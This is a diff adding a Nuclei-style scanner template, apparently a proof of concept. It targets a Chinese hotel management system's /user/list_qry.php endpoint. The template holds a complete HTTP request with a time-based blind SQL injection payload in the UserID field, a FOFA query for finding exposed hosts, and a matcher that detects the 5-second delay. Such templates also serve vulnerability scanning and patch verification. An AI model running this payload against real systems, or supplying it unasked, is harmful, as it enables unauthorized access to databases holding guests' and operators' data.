@@ -1,0 +1,31 @@
+id: poc-svym24hbydsk3fly
+info:
+  name: 安美酒店管理系统 list_qry.php存在sql注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/svym24hbydsk3fly
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: svym24hbydsk3fly
+    fofa: title="酒店宽带运营系统"
+http:
+- raw:
+  - 'POST /user/list_qry.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    UserID=0''XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR''Z&starttime=2023-01-01&stoptime=2023-12-31'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
